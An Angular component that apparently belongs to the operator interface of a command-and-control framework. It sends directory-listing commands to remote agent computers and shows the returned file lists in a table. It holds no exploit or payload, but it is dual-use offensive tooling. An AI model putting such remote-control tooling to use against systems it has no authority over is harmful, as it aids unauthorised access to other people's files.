import { Component, OnInit, Input, ViewChild } from '@angular/core';
import { MatPaginator } from '@angular/material/paginator';
import { MatSort } from '@angular/material/sort';
import { MatDialog } from "@angular/material/dialog";
import { PacketInfo, Packet, Campaign, DirEntry } from '../app.model';
import { HttpErrorResponse } from '@angular/common/http';
import { ApiService } from '../api.service';
import { DataService } from '../data.service';
import { MatTableDataSource } from '@angular/material/table';

@Component({
  selector: 'app-cmd-browse',
  templateUrl: './cmd-browse.component.html',
  styleUrls: ['./cmd-browse.component.css']
})
export class CmdBrowseComponent implements OnInit {
  // Input
  @Input() computerId = "";
  downstreamId: string = "client"
  dirContent: DirEntry[] = [];

  // UI
  browse: string = "./"

  dataSource: MatTableDataSource<DirEntry> = new MatTableDataSource<DirEntry>();
  @ViewChild(MatSort) sort!: MatSort;
  @ViewChild(MatPaginator) paginator!: MatPaginator;

  displayedColumns: String[] = [
    'actions', 'name',  'size', 'modified', 'isDir', ];
  pageSizeOptions: Number[] = [3, 5, 10];


  constructor(
    private apiService: ApiService,
    private dataService: DataService,
  ) { }

  ngOnInit(): void {
    this.updateDir();
    this.dataService.packetInfosEvent.subscribe((packetInfo: PacketInfo) => {
      // Check if it concerns us
      if (packetInfo == undefined || packetInfo.Packet.computerid == this.computerId) {
        this.updateDir();
      }
    })

    // Downstream-Selection
    this.dataService.downstreamSelection.subscribe(downstreamId => {
      this.downstreamId = downstreamId;
    });
  }

  handleSelect(dirEntry: DirEntry): void {
    if (! dirEntry.isDir) {
      return;
    }
    this.sendPacketDir(this.browse + "/" + dirEntry.name)
  }

  ngAfterViewInit() {
    // Connect the table components
    this.dataSource.paginator = this.paginator;
    this.dataSource.sort = this.sort;
  } 
  
  updateDir() {
    var data2 = this.dataService.packetInfos;
    var newData = data2.filter(d => 
      (d.Packet.computerid == this.computerId && d.Packet.packetType == "dir")
    );

    if (newData.length == 0) {
      return;
    }
    var latestPacket = newData[newData.length - 1].Packet
    if (! ("filelist" in latestPacket.response)) {
      return;
    }

    var json = latestPacket.response["filelist"];
    var data: DirEntry[] = JSON.parse(json); 
    this.dirContent = data;
    this.dataSource.data = data;

    this.browse = latestPacket.arguments["path"];
  }


  send() {
    this.sendPacketDir(this.browse);
  }

  sendPacketDir(path: string) {
    var packetId = this.apiService.getRandomInt();
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: packetId,
      packetType: 'dir',
      arguments: { 
        "path": path,
      },
      response: {},
      downstreamId: this.downstreamId,
    }
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")

        // Subscribe to new packets until ours is found

      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );

  }

  // Table filter
  applyFilter(event: any) {
    var filterValue: string = event.target.value;
    filterValue = filterValue.trim(); // Remove whitespace
    filterValue = filterValue.toLowerCase(); // Datasource defaults to lowercase matches
    this.dataSource.filter = filterValue;
  }
}
